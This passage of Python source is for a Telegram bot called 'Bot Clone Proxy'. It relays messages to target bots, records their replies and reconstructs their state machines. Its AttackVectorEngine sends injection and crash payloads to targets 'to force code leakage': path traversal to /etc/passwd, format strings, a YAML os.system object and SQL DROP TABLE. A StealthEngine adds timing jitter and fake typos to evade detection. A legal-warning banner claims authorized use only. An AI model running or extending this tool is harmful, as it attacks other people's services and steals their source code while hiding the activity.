        status = "🟢 Active" if not session_info.get("paused") else "⏸️ Paused"
        duration = datetime.now() - session_info["start_time"]
        minutes = duration.seconds // 60
        seconds = duration.seconds % 60
        
        return (
            f"<b>📊 Session Status</b>\n\n"
            f"<b>Target:</b> @{session_info['target_username']}\n"
            f"<b>Status:</b> {status}\n"
            f"<b>Duration:</b> {minutes}m {seconds}s\n"
            f"<b>Interactions:</b> {session_info['interactions']}\n"
            f"<b>Current State:</b> {session_info['last_state']}\n"
            f"<b>Stealth Level:</b> {session_info['stealth'].level.upper()}"
        )

# ============================================================================
# STEALTH ENGINE (same as before)
# ============================================================================

class StealthEngine:
    """Advanced stealth mechanisms to avoid detection"""
    
    def __init__(self, user_id: int, level: str = "balanced"):
        self.user_id = user_id
        self.level = level
        self.config = STEALTH_LEVELS[level]
        self.action_timestamps = []
        self.last_action_time = datetime.now()
        self.consecutive_actions = 0
        self.session_token = str(uuid.uuid4())[:8]
        self.typing_patterns = []
        
    async def pre_send_delay(self, target_bot_id: int, from_state: str = "unknown"):
        """Calculate and wait appropriate delay"""
        try:
            # Get observed timing from database
            cursor = db.execute(
                """SELECT avg_delay, std_dev, min_delay, max_delay 
                   FROM timing_patterns 
                   WHERE target_bot_id = ? AND from_state = ? 
                   ORDER BY sample_count DESC LIMIT 1""",
                (target_bot_id, from_state)
            )
            result = cursor.fetchone()
            
            if result:
                avg_delay, std_dev, min_delay, max_delay = result
                delay = random.gauss(avg_delay, max(std_dev * 0.3, 0.1))
                delay = max(min_delay * 0.8, min(delay, max_delay * 1.2))
            else:
                delay = random.uniform(0.3, 1.5)
            
            # Apply stealth level multiplier
            delay *= random.uniform(*self.config["delay_multiplier"])
            
            # Add jitter
            delay += random.uniform(*self.config["jitter_range"])
            
            # Rate limiting check
            await self._check_rate_limit()
            
            logger.debug(f"Stealth delay: {delay:.2f}s")
            await asyncio.sleep(delay)
            
            self.last_action_time = datetime.now()
            self.consecutive_actions += 1
            
        except Exception as e:
            logger.error(f"Error in stealth delay: {e}")
            await asyncio.sleep(0.5)
    
    async def simulate_typing(self, bot: Bot, chat_id: int, text_length: int = None):
        """Realistic typing simulation"""
        try:
            if text_length:
                base_time = text_length / 200 * 60
                variance = random.uniform(*self.config["typing_variance"])
                typing_time = base_time * variance
            else:
                typing_time = random.uniform(0.5, 2.0)
            
            async with ChatActionSender.typing(bot=bot, chat_id=chat_id):
                await asyncio.sleep(typing_time)
                    
        except Exception as e:
            logger.error(f"Error simulating typing: {e}")
    
    async def _check_rate_limit(self):
        """Ensure we don't exceed rate limits"""
        now = datetime.now()
        cutoff = now - timedelta(seconds=60)
        
        self.action_timestamps = [ts for ts in self.action_timestamps if ts > cutoff]
        
        if len(self.action_timestamps) >= self.config["max_actions_per_min"]:
            wait_time = 60 - (now - self.action_timestamps[0]).total_seconds()
            if wait_time > 0:
                logger.info(f"Rate limiting: waiting {wait_time:.2f}s")
                await asyncio.sleep(wait_time)
        
        self.action_timestamps.append(now)
    
    def should_simulate_error(self) -> bool:
        """Occasionally simulate human-like mistakes"""
        return random.random() < self.config["human_error_prob"]
    
    def get_modified_text(self, original: str) -> str:
        """Slightly modify text to avoid fingerprinting"""
        if not self.should_simulate_error() or len(original) < 10:
            return original
        
        # Simulate typo
        if random.random() < 0.3:
            pos = random.randint(1, len(original) - 2)
            chars = list(original)
            chars[pos], chars[pos + 1] = chars[pos + 1], chars[pos]
            return ''.join(chars)
        
        return original
    
    def reset(self):
        """Reset stealth engine state"""
        self.consecutive_actions = 0
        self.action_timestamps = []

# ============================================================================
# ATTACK VECTOR ENGINE (same as before)
# ============================================================================

class AttackVectorEngine:
    """Advanced attack vectors to force code leakage"""
    
    def __init__(self, target_bot_id: int, target_username: str):
        self.target_bot_id = target_bot_id
        self.target_username = target_username
        
    async def execute_all_vectors(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[Dict]:
        """Execute all attack vectors"""
        results = []
        
        vectors = [
            ("traceback", self.force_tracebacks),
            ("library", self.library_exploits),
            ("probe", self.probe_debug_commands),
            ("crash", self.trigger_crashes)
        ]
        
        for vector_name, vector_func in vectors:
            try:
                result = await vector_func(bot, message, stealth)
                results.append({
                    "vector": vector_name,
                    "success": bool(result),
                    "details": result
                })
                await asyncio.sleep(random.uniform(1, 3))
            except Exception as e:
                logger.error(f"Error in vector {vector_name}: {e}")
                results.append({
                    "vector": vector_name,
                    "success": False,
                    "error": str(e)
                })
        
        return results
    
    async def force_tracebacks(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt to force Python tracebacks"""
        tracebacks = []
        
        payloads = [
            "A" * 50000,
            "[[[]]]" * 500,
            "../../../etc/passwd\n" * 50,
            "%s" * 100 + "%n%n%n",
        ]
        
        for payload in payloads:
            try:
                await stealth.pre_send_delay(self.target_bot_id, "attack_traceback")
                
                await bot.send_message(
                    chat_id=f"@{self.target_username}",
                    text=payload
                )
                
                await asyncio.sleep(2)
                
            except Exception as e:
                error_str = str(e)
                if any(term in error_str.lower() for term in ['traceback', 'file "/', 'line ']):
                    tracebacks.append(error_str)
                    db.add_code_fragment(
                        self.target_bot_id,
                        'traceback',
                        error_str,
                        source_vector='traceback_forcing',
                        confidence=0.6
                    )
        
        return tracebacks
    
    async def probe_debug_commands(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Probe for debug commands"""
        commands = [
            "/source", "/code", "/debug", "/version", "/eval",
            "/var_dump", "/print_r", "/stacktrace", "/backtrace",
        ]
        
        for cmd in commands:
            try:
                await stealth.pre_send_delay(self.target_bot_id, "attack_probe")
                await bot.send_message(chat_id=f"@{self.target_username}", text=cmd)
                await asyncio.sleep(1)
            except Exception as e:
                logger.debug(f"Probe command {cmd} caused error: {e}")
        
        return []
    
    async def library_exploits(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt library exploits"""
        payloads = [
            '{"key": "\ud800"}',
            "!!python/object/apply:os.system ['echo test']",
            "'; DROP TABLE users; --",
        ]
        
        for payload in payloads:
            try:
                await stealth.pre_send_delay(self.target_bot_id, "attack_library")
                await bot.send_message(chat_id=f"@{self.target_username}", text=payload)
                await asyncio.sleep(2)
            except Exception as e:
                logger.debug(f"Library exploit error: {e}")
        
        return []
    
    async def trigger_crashes(self, bot: Bot, message: Message, stealth: StealthEngine) -> List[str]:
        """Attempt to trigger crashes"""
        try:
            builder = InlineKeyboardBuilder()
            builder.button(text="Crash Test", callback_data="A" * 200)
            
            await stealth.pre_send_delay(self.target_bot_id, "attack_crash")
            
            await bot.send_message(
                chat_id=f"@{self.target_username}",
                text="Crash test",
                reply_markup=builder.as_markup()
            )
        except Exception as e:
            return [str(e)]
        
        return []

# ============================================================================
# MESSAGE PROCESSOR (same as before)
# ============================================================================

class MessageProcessor:
    """Process and analyze messages from target bot"""
    
    def __init__(self, target_bot_id: int):
        self.target_bot_id = target_bot_id
        
    async def process_response(self, message: types.Message) -> Dict:
        """Process a response from target bot"""
        analysis = {
            "type": message.content_type,
            "has_text": bool(message.text),
            "has_buttons": bool(message.reply_markup and message.reply_markup.inline_keyboard),
            "raw_data": message.model_dump(exclude_none=True),
            "timestamp": datetime.now().isoformat()
        }
        
        if message.text:
            analysis["text"] = message.text
            patterns = db.detect_patterns(self.target_bot_id, message.text)
            analysis["patterns"] = patterns
        
        if message.reply_markup and message.reply_markup.inline_keyboard:
            buttons = []
            for row in message.reply_markup.inline_keyboard:
                for button in row:
                    button_info = {
                        "text": button.text,
                        "type": "callback" if button.callback_data else "url"
                    }
                    if button.callback_data:
                        button_info["callback_data"] = button.callback_data
                    buttons.append(button_info)
            analysis["buttons"] = buttons
        
        return analysis

# ============================================================================
# STATE MACHINE RECONSTRUCTOR (same as before)
# ============================================================================

class StateMachineReconstructor:
    """Reconstruct FSM from observed interactions"""
    
    def __init__(self, target_bot_id: int):
        self.target_bot_id = target_bot_id
        self.states: Dict[str, BotState] = {}
        self.transitions: List[Dict] = []
        
    async def rebuild_from_history(self) -> Dict:
        """Rebuild FSM from database history"""
        try:
            # Get button flows
            cursor = db.execute(
                """SELECT from_state, button_text, button_callback_data, to_state, frequency 
                   FROM button_flows WHERE target_bot_id = ?""",
                (self.target_bot_id,)
            )
            flows = cursor.fetchall()
            
            for flow in flows:
                from_state, btn_text, btn_cb, to_state, freq = flow
                
                from_state = from_state or "unknown"
                to_state = to_state or "unknown"
                
                if from_state not in self.states:
                    self.states[from_state] = BotState(
                        name=from_state,
                        description=f"State with {freq} observations"
                    )
                
                button_info = {
                    "text": btn_text,
                    "callback_data": btn_cb,
                    "leads_to": to_state
                }
                
                if button_info not in self.states[from_state].buttons:
                    self.states[from_state].buttons.append(button_info)
                
                self.transitions.append({
                    "from": from_state,
                    "to": to_state,
                    "trigger": btn_text
                })
            
            return {
                "states": list(self.states.keys()),
                "transitions": self.transitions,
                "state_count": len(self.states),
                "transition_count": len(self.transitions)
            }
            
        except Exception as e:
            logger.error(f"Error rebuilding FSM: {e}")
            return {"error": str(e)}
    
    def generate_mermaid_diagram(self) -> str:
        """Generate Mermaid flowchart"""
        if not self.states:
            return "graph TD\n    Start[No states detected]"
        
        diagram = ["graph TD"]
        
        for state_name in self.states:
            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', state_name)
            diagram.append(f'    {safe_name}["{state_name}"]')
        
        for trans in self.transitions:
            from_safe = re.sub(r'[^a-zA-Z0-9]', '_', trans["from"])
            to_safe = re.sub(r'[^a-zA-Z0-9]', '_', trans["to"])
            diagram.append(f'    {from_safe} -->|"{trans["trigger"]}"| {to_safe}')
        
        return "\n".join(diagram)
    
    def generate_python_stubs(self) -> str:
        """Generate Python stubs"""
        stubs = [
            "#!/usr/bin/env python3",
            "# AUTO-GENERATED FSM STUBS",
            f"# Target Bot ID: {self.target_bot_id}",
            f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "from aiogram import Router, types, F",
            "from aiogram.fsm.context import FSMContext",
            "from aiogram.fsm.state import State, StatesGroup",
            "from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton",
            "from aiogram.utils.keyboard import InlineKeyboardBuilder",
            "",
            "class BotStates(StatesGroup):"
        ]
        
        for state_name in self.states:
            if state_name != "unknown":
                safe_name = state_name.upper().replace(" ", "_").replace("-", "_")
                stubs.append(f"    {safe_name} = State()")
        
        stubs.append("")
        stubs.append("router = Router()")
        stubs.append("")
        
        for trans in self.transitions:
            if trans["from"] != "unknown" and trans["to"] != "unknown":
                from_safe = trans["from"].upper().replace(" ", "_").replace("-", "_")
                to_safe = trans["to"].upper().replace(" ", "_").replace("-", "_")
                
                stubs.append(f"@router.callback_query(F.data == \"{trans['trigger']}\")")
                stubs.append(f"async def handle_{trans['from'].lower()}_to_{trans['to'].lower()}(callback: types.CallbackQuery, state: FSMContext):")
                stubs.append(f"    await state.set_state(BotStates.{to_safe})")
                stubs.append("    await callback.answer()")
                stubs.append("")
        
        return "\n".join(stubs)

# ============================================================================
# HANDLERS - FIXED WITH HTML
# ============================================================================

@router.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    """Start command"""
    await state.set_state(CloneStates.main_menu)
    
    if message.from_user.id not in user_settings:
        user_settings[message.from_user.id] = {"stealth_level": "balanced"}
    
    user_data = await state.get_data()
    if not user_data.get("accepted_warning", False):
        warning_text = (
            "╔════════════════════════════════════════════╗\n"
            "║           ⚠️ LEGAL WARNING ⚠️               ║\n"
            "╚════════════════════════════════════════════╝\n\n"
            "This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING ONLY.\n\n"
            "By clicking I UNDERSTAND, you confirm:\n"
            "✅ You have EXPLICIT PERMISSION\n"
            "✅ You are ONLY testing your OWN bots\n"
            "✅ You accept FULL LEGAL RESPONSIBILITY"
        )
        
        await message.answer(
            warning_text,
            reply_markup=UIComponents.confirm_warning()
        )
    else:
        await show_main_menu(message, state)

async def show_main_menu(message: types.Message, state: FSMContext):
    """Show main menu"""
    user_data = await state.get_data()
    stealth_level = user_data.get("stealth_level", "balanced")
    
    welcome_text = (
        f"<b>🤖 Bot Clone Proxy v{VERSION}</b>\n\n"
        f"<b>🛡️ Stealth Mode:</b> {stealth_level.upper()}\n"
        f"<b>👤 User ID:</b> {message.from_user.id}\n\n"
        f"Select an option:"
    )
    
    await message.answer(welcome_text, reply_markup=UIComponents.main_menu())

@router.callback_query(F.data == "ack_legal_warning")
async def ack_warning(callback: CallbackQuery, state: FSMContext):
    """Acknowledge warning"""
    await state.update_data(accepted_warning=True)
    await callback.message.delete()
    await show_main_menu(callback.message, state)
    await callback.answer()

@router.callback_query(F.data == "menu_main")
async def main_menu(callback: CallbackQuery, state: FSMContext):
    """Return to main menu"""
    await state.set_state(CloneStates.main_menu)
    
    user_data = await state.get_data()
    stealth_level = user_data.get("stealth_level", "balanced")
    
    welcome_text = (
        f"<b>🤖 Bot Clone Proxy v{VERSION}</b>\n\n"
        f"<b>🛡️ Stealth Mode:</b> {stealth_level.upper()}\n"
        f"<b>👤 User ID:</b> {callback.from_user.id}\n\n"
        f"Select an option:"
    )
    
    await callback.message.edit_text(welcome_text, reply_markup=UIComponents.main_menu())
    await callback.answer()

@router.callback_query(F.data == "menu_help")
async def show_help(callback: CallbackQuery):
    """Show help"""
    help_text = (
        "<b>📚 Help</b>\n\n"
        "<b>Features:</b>\n"
        "• Add Target Bot - Add a bot to analyze\n"
        "• Clone Session - Forward messages through target\n"
        "• Attack Vectors - Attempt code extraction\n"
        "• View Leaks - See recovered code\n"
        "• Export Data - Save results\n\n"
        "<b>How to use:</b>\n"
        "1. Add a target bot\n"
        "2. Start clone session\n"
        "3. Interact with the bot\n"
        "4. Check leaks and export data"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Main Menu", callback_data="menu_main"))
    
    await callback.message.edit_text(help_text, reply_markup=builder.as_markup())
    await callback.answer()

@router.callback_query(F.data == "menu_reset")
async def reset_bot(callback: CallbackQuery, state: FSMContext):
    """Reset bot state"""
    await state.clear()
    await state.set_state(CloneStates.main_menu)
    
    if callback.from_user.id in user_settings:
        user_settings[callback.from_user.id] = {"stealth_level": "balanced"}
    
    await callback.message.edit_text("✅ Bot reset successfully!\n\nRestarting...")
    await asyncio.sleep(1)
    await cmd_start(callback.message, state)
    await callback.answer()

@router.callback_query(F.data == "menu_exit")
async def exit_bot(callback: CallbackQuery, state: FSMContext):
    """Exit the bot"""
    await callback.message.edit_text("👋 Goodbye!\n\nUse /start to restart.")
    await state.clear()
    await callback.answer()

@router.callback_query(F.data == "menu_add_target")
async def add_target_prompt(callback: CallbackQuery, state: FSMContext):
    """Add target bot prompt"""
    await state.set_state(CloneStates.adding_target)
    
    text = (
        "<b>📝 Add Target Bot</b>\n\n"
        "Send me the bot's username (with or without @):\n\n"
        "Examples:\n"
        "• @example_bot\n"
        "• example_bot"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Cancel", callback_data="menu_main"))
    
    await callback.message.edit_text(text, reply_markup=builder.as_markup())
    await callback.answer()

@router.message(CloneStates.adding_target)
async def process_add_target(message: types.Message, state: FSMContext):
    """Process new target bot"""
    try:
        username = message.text.strip().replace('@', '')
        
        if not re.match(r'^[a-zA-Z0-9_]{5,32}$', username):
            await message.answer(
                "<b>❌ Invalid username</b>\n\n"
                "Requirements:\n"
                "• 5-32 characters\n"
                "• Letters, numbers, underscore only"
            )
            return
        
        bot_id = db.add_target_bot(username, {"added_by": message.from_user.id})
        
        if bot_id:
            text = f"<b>✅ Bot @{username} added successfully!</b>\nBot ID: {bot_id}"
        else:
            text = "<b>❌ Failed to add bot</b>\nPlease try again."
        
        await message.answer(text, reply_markup=UIComponents.main_menu())
        await state.set_state(CloneStates.main_menu)
        
    except Exception as e:
        logger.error(f"Error adding bot: {e}")
        await message.answer(
            f"<b>❌ Error:</b> {str(e)[:100]}",
            reply_markup=UIComponents.main_menu()
        )
        await state.set_state(CloneStates.main_menu)

@router.callback_query(F.data == "menu_list_bots")
async def list_bots(callback: CallbackQuery, state: FSMContext):
    """List all target bots"""
    try:
        bots = db.get_target_bots(limit=100)
        
        if not bots:
            await callback.message.edit_text(
                "<b>📭 No bots added yet.</b>\n\nUse 'Add Target Bot' to get started.",
                reply_markup=UIComponents.main_menu()
            )
            await callback.answer()
            return
        
        await state.update_data(bots_list=bots, current_page=0)
        
        text = "<b>📋 Your Target Bots</b>\n\n"
        for bot in bots[:5]:
            last_active = bot.get('last_active', 'Never')
            if last_active and last_active != 'Never':
                try:
                    last_active = datetime.fromisoformat(last_active).strftime('%Y-%m-%d')
                except:
                    pass
            
            text += f"• @{bot['username']} - {bot['total_interactions']} msgs\n"
        
        await callback.message.edit_text(text, reply_markup=UIComponents.bot_list(bots, 0))
        await callback.answer()
        
    except Exception as e:
        logger.error(f"Error listing bots: {e}")
        await callback.message.edit_text(
            f"<b>❌ Error:</b> {str(e)[:100]}",
            reply_markup=UIComponents.main_menu()
        )
        await callback.answer()

@router.callback_query(F.data.startswith("bots_page_"))
async def paginate_bots(callback: CallbackQuery, state: FSMContext):
    """Handle bot list pagination"""
    page = int(callback.data.split("_")[2])
    user_data = await state.get_data()
    bots = user_data.get("bots_list", [])
    
    if not bots:
        await callback.answer("No bots found", show_alert=True)
        return
    
    items_per_page = 8
    start = page * items_per_page
    end = start + items_per_page
    page_bots = bots[start:end]
    
    text = f"<b>📋 Your Target Bots (Page {page + 1}/{(len(bots)-1)//items_per_page + 1})</b>\n\n"
    for bot in page_bots:
        text += f"• @{bot['username']} - {bot['total_interactions']} msgs\n"
    
    await callback.message.edit_text(text, reply_markup=UIComponents.bot_list(bots, page))
    await callback.answer()

@router.callback_query(F.data.startswith("select_bot_"))
async def select_bot(callback: CallbackQuery, state: FSMContext):
    """Select a specific bot"""
    bot_id = int(callback.data.split("_")[2])
    
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    username = bot_info['username']
    await state.update_data(selected_bot_id=bot_id, selected_bot_username=username)
    
    stats = db.get_bot_statistics(bot_id)
    
    info_text = (
        f"<b>🤖 @{username}</b>\n\n"
        f"<b>Statistics:</b>\n"
        f"• Interactions: {bot_info['total_interactions']}\n"
        f"• Avg Response: {stats.get('avg_response', 0):.2f}s\n"
        f"• Button Flows: {stats.get('flow_stats', {}).get('total_flows', 0)}\n"
        f"• Patterns: {len(stats.get('pattern_stats', {}))}\n"
        f"• Code Fragments: {stats.get('code_fragments', 0)}\n\n"
        f"<b>Select action:</b>"
    )
    
    await callback.message.edit_text(
        info_text,
        reply_markup=UIComponents.bot_action_menu(bot_id, username)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("clone_"))
async def start_clone_session(callback: CallbackQuery, state: FSMContext):
    """Start cloning session"""
    bot_id = int(callback.data.split("_")[1])
    
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    username = bot_info['username']
    
    user_data = await state.get_data()
    stealth_level = user_data.get("stealth_level", "balanced")
    session_uuid = db.create_session(callback.from_user.id, bot_id, stealth_level)
    
    if not session_uuid:
        await callback.answer("Error creating session!", show_alert=True)
        return
    
    if callback.from_user.id not in user_stealth_engines:
        user_stealth_engines[callback.from_user.id] = StealthEngine(callback.from_user.id, stealth_level)
    
    active_sessions[callback.from_user.id] = {
        "session_uuid": session_uuid,
        "target_bot_id": bot_id,
        "target_username": username,
        "stealth": user_stealth_engines[callback.from_user.id],
        "processor": MessageProcessor(bot_id),
        "start_time": datetime.now(),
        "interactions": 0,
        "last_state": "initial",
        "paused": False
    }
    
    await state.set_state(CloneStates.cloning_session)
    
    welcome_text = (
        f"<b>🔄 Clone Session Started</b>\n\n"
        f"<b>Target:</b> @{username}\n"
        f"<b>Stealth Level:</b> {stealth_level.upper()}\n"
        f"<b>Session ID:</b> {session_uuid[:8]}...\n\n"
        f"<b>Instructions:</b>\n"
        f"• Every message you send will be forwarded to @{username}\n"
        f"• All responses will be captured and analyzed\n"
        f"• Use the controls below to manage the session.\n\n"
        f"{UIComponents.session_status(active_sessions[callback.from_user.id])}"
    )
    
    await callback.message.edit_text(
        welcome_text,
        reply_markup=UIComponents.clone_session_controls(username, session_uuid[:8])
    )
    await callback.answer()

@router.callback_query(F.data.startswith("pause_"))
async def pause_session(callback: CallbackQuery):
    """Pause clone session"""
    session_id = callback.data.split("_")[1]
    
    if callback.from_user.id in active_sessions:
        active_sessions[callback.from_user.id]["paused"] = True
        
        await callback.message.edit_text(
            "<b>⏸️ Session Paused</b>\n\n"
            "Messages will not be forwarded until resumed.",
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="▶️ Resume", callback_data=f"resume_{session_id}"),
                InlineKeyboardButton(text="⏹️ Stop", callback_data=f"stop_{session_id}")
            ).as_markup()
        )
    await callback.answer()

@router.callback_query(F.data.startswith("resume_"))
async def resume_session(callback: CallbackQuery):
    """Resume paused session"""
    session_id = callback.data.split("_")[1]
    
    if callback.from_user.id in active_sessions:
        active_sessions[callback.from_user.id]["paused"] = False
        session_info = active_sessions[callback.from_user.id]
        
        await callback.message.edit_text(
            f"<b>▶️ Session Resumed</b>\n\n"
            f"{UIComponents.session_status(session_info)}",
            reply_markup=UIComponents.clone_session_controls(
                session_info['target_username'], session_id
            )
        )
    await callback.answer()

@router.callback_query(F.data.startswith("stop_"))
async def stop_session(callback: CallbackQuery, state: FSMContext):
    """Stop clone session"""
    session_id = callback.data.split("_")[1]
    
    if callback.from_user.id in active_sessions:
        session_info = active_sessions.pop(callback.from_user.id)
        db.end_session(session_info["session_uuid"])
        
        duration = datetime.now() - session_info["start_time"]
        
        await callback.message.edit_text(
            f"<b>⏹️ Session Stopped</b>\n\n"
            f"<b>Statistics:</b>\n"
            f"• Duration: {duration.seconds // 60}m {duration.seconds % 60}s\n"
            f"• Interactions: {session_info['interactions']}\n"
            f"• Final State: {session_info['last_state']}\n\n"
            f"Data saved to database.",
            reply_markup=UIComponents.main_menu()
        )
    
    await state.set_state(CloneStates.main_menu)
    await callback.answer()

@router.callback_query(F.data.startswith("session_stats_"))
async def session_stats(callback: CallbackQuery):
    """Show session statistics"""
    if callback.from_user.id in active_sessions:
        session_info = active_sessions[callback.from_user.id]
        await callback.message.edit_text(
            UIComponents.session_status(session_info)
        )
    await callback.answer()

@router.message(CloneStates.cloning_session)
async def handle_clone_message(message: types.Message, state: FSMContext, bot: Bot):
    """Forward messages to target bot"""
    session_info = active_sessions.get(message.from_user.id)
    
    if not session_info:
        await message.answer("No active session. Please start a new session.")
        await state.set_state(CloneStates.main_menu)
        return
    
    if session_info.get("paused", False):
        await message.answer("⏸️ Session is paused. Resume to continue.")
        return
    
    try:
        stealth = session_info["stealth"]
        processor = session_info["processor"]
        target_bot = session_info["target_username"]
        target_bot_id = session_info["target_bot_id"]
        
        start_time = time.time()
        
        await stealth.pre_send_delay(target_bot_id, session_info["last_state"])
        
        # Send typing indicator
        await bot.send_chat_action(chat_id=message.chat.id, action="typing")
        await asyncio.sleep(0.5)
        
        sent_message = None
        
        if message.text:
            await stealth.simulate_typing(bot, message.chat.id, len(message.text))
            
            text_to_send = message.text
            if stealth.should_simulate_error():
                text_to_send = stealth.get_modified_text(message.text)
            
            sent_message = await bot.send_message(
                chat_id=f"@{target_bot}",
                text=text_to_send
            )
            
        elif message.photo:
            photo = message.photo[-1]
            sent_message = await bot.send_photo(chat_id=f"@{target_bot}", photo=photo.file_id)
            
        elif message.video:
            sent_message = await bot.send_video(chat_id=f"@{target_bot}", video=message.video.file_id)
            
        elif message.document:
            sent_message = await bot.send_document(chat_id=f"@{target_bot}", document=message.document.file_id)
            
        elif message.sticker:
            sent_message = await bot.send_sticker(chat_id=f"@{target_bot}", sticker=message.sticker.file_id)
            
        elif message.voice:
            sent_message = await bot.send_voice(chat_id=f"@{target_bot}", voice=message.voice.file_id)
            
        elif message.audio:
            sent_message = await bot.send_audio(chat_id=f"@{target_bot}", audio=message.audio.file_id)
            
        elif message.animation:
            sent_message = await bot.send_animation(chat_id=f"@{target_bot}", animation=message.animation.file_id)
            
        else:
            await message.reply(f"⚠️ {message.content_type} forwarding not supported")
            return
        
        response_time_ms = int((time.time() - start_time) * 1000)
        
        db.add_interaction({
            "session_id": session_info["session_uuid"],
            "target_bot_id": target_bot_id,
            "direction": "user_to_target",
            "message_type": message.content_type,
            "response_time_ms": response_time_ms,
            "raw_data": {"text": message.text if message.text else None}
        })
        
        db.update_bot_stats(target_bot_id, response_time_ms, True)
        
        session_info["interactions"] += 1
        session_info["last_state"] = message.content_type
        
        await message.reply(f"<b>✅ Forwarded to @{target_bot}</b>\nInteractions: {session_info['interactions']}")
        
    except Exception as e:
        logger.error(f"Error forwarding message: {e}")
        await message.reply(f"<b>❌ Error:</b> {str(e)[:200]}")

@router.message()
async def handle_incoming_messages(message: types.Message, bot: Bot):
    """Handle incoming messages from target bots"""
    if message.from_user and message.from_user.is_bot:
        bot_username = message.from_user.username
        
        for user_id, session_info in list(active_sessions.items()):
            if session_info["target_username"] == bot_username and not session_info.get("paused", False):
                try:
                    processor = session_info["processor"]
                    analysis = await processor.process_response(message)
                    
                    db.add_interaction({
                        "session_id": session_info["session_uuid"],
                        "target_bot_id": session_info["target_bot_id"],
                        "direction": "target_to_user",
                        "message_type": message.content_type,
                        "raw_data": analysis
                    })
                    
                    if analysis.get("buttons"):
                        for button in analysis["buttons"]:
                            if button.get("callback_data"):
                                db.add_button_flow({
                                    "target_bot_id": session_info["target_bot_id"],
                                    "from_state": session_info["last_state"],
                                    "button_text": button["text"],
                                    "button_callback_data": button["callback_data"],
                                    "to_state": "unknown",
                                    "response_type": "callback",
                                    "confidence": 0.7
                                })
                    
                    # Forward response to user
                    response_text = f"<b>🤖 Response from @{bot_username}</b>\n\n"
                    
                    if message.text:
                        response_text += message.text
                    elif message.caption:
                        response_text += message.caption
                    
                    if analysis.get("buttons"):
                        response_text += f"\n\n<b>Buttons:</b> {len(analysis['buttons'])} detected"
                    
                    # Send with appropriate media
                    if message.photo:
                        await bot.send_photo(
                            chat_id=user_id,
                            photo=message.photo[-1].file_id,
                            caption=response_text
                        )
                    elif message.video:
                        await bot.send_video(
                            chat_id=user_id,
                            video=message.video.file_id,
                            caption=response_text
                        )
                    elif message.document:
                        await bot.send_document(
                            chat_id=user_id,
                            document=message.document.file_id,
                            caption=response_text
                        )
                    else:
                        await bot.send_message(chat_id=user_id, text=response_text)
                    
                except Exception as e:
                    logger.error(f"Error processing bot response: {e}")
                
                break

# ============================================================================
# STATISTICS HANDLERS - FIXED WITH HTML
# ============================================================================

@router.callback_query(F.data == "menu_stats")
async def view_global_statistics(callback: CallbackQuery):
    """View overall statistics"""
    cursor = db.execute("SELECT COUNT(*) FROM target_bots")
    bot_count = cursor.fetchone()[0]
    
    cursor = db.execute("SELECT COUNT(*) FROM interactions")
    interaction_count = cursor.fetchone()[0]
    
    cursor = db.execute("SELECT COUNT(*) FROM button_flows")
    flow_count = cursor.fetchone()[0]
    
    cursor = db.execute("SELECT COUNT(DISTINCT pattern_type) FROM patterns")
    pattern_count = cursor.fetchone()[0]
    
    cursor = db.execute("SELECT COUNT(*) FROM code_fragments")
    fragment_count = cursor.fetchone()[0]
    
    cursor = db.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
    active_sessions_count = cursor.fetchone()[0]
    
    stats_text = (
        f"<b>📊 Global Statistics</b>\n\n"
        f"<b>Bots:</b> {bot_count} (Active: {active_sessions_count})\n"
        f"<b>Interactions:</b> {interaction_count}\n"
        f"<b>Button Flows:</b> {flow_count}\n"
        f"<b>Patterns:</b> {pattern_count}\n"
        f"<b>Code Fragments:</b> {fragment_count}\n\n"
        f"Select a bot for details:"
    )
    
    bots = db.get_target_bots(limit=5)
    builder = InlineKeyboardBuilder()
    
    for bot in bots:
        builder.row(InlineKeyboardButton(
            text=f"📊 @{bot['username']}",
            callback_data=f"stats_bot_{bot['id']}"
        ))
    
    builder.row(InlineKeyboardButton(text="🔙 Main", callback_data="menu_main"))
    
    await callback.message.edit_text(stats_text, reply_markup=builder.as_markup())
    await callback.answer()

@router.callback_query(F.data.startswith("stats_bot_"))
async def view_bot_statistics(callback: CallbackQuery):
    """View statistics for specific bot"""
    bot_id = int(callback.data.split("_")[2])
    
    bot_info = db.get_target_bot(bot_id)
    if not bot_info:
        await callback.answer("Bot not found!", show_alert=True)
        return
    
    stats = db.get_bot_statistics(bot_id)
    
    stats_text = (
        f"<b>📊 Statistics: @{bot_info['username']}</b>\n\n"
        f"<b>General:</b>\n"
        f"• Interactions: {bot_info['total_interactions']}\n"
        f"• Success Rate: {bot_info.get('success_rate', 0)*100:.1f}%\n"
        f"• Avg Response: {stats.get('avg_response', 0):.2f}s\n\n"
        f"<b>States & Flows:</b>\n"
        f"• Detected States: {stats.get('flow_stats', {}).get('states', 0)}\n"
        f"• Button Flows: {stats.get('flow_stats', {}).get('total_flows', 0)}\n\n"
        f"<b>Patterns:</b> {len(stats.get('pattern_stats', {}))}\n"
        f"<b>Code Fragments:</b> {stats.get('code_fragments', 0)}"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="📤 Export", callback_data=f"export_bot_{bot_id}"),
        InlineKeyboardButton(text="🔄 Refresh", callback_data=f"stats_bot_{bot_id}")
    )
    builder.row(InlineKeyboardButton(text="🔙 Back", callback_data="menu_stats"))
    
    await callback.message.edit_text(stats_text, reply_markup=builder.as_markup())
    await callback.answer()

# ============================================================================
# SETTINGS HANDLERS - FIXED WITH HTML
# ============================================================================

@router.callback_query(F.data == "menu_settings")
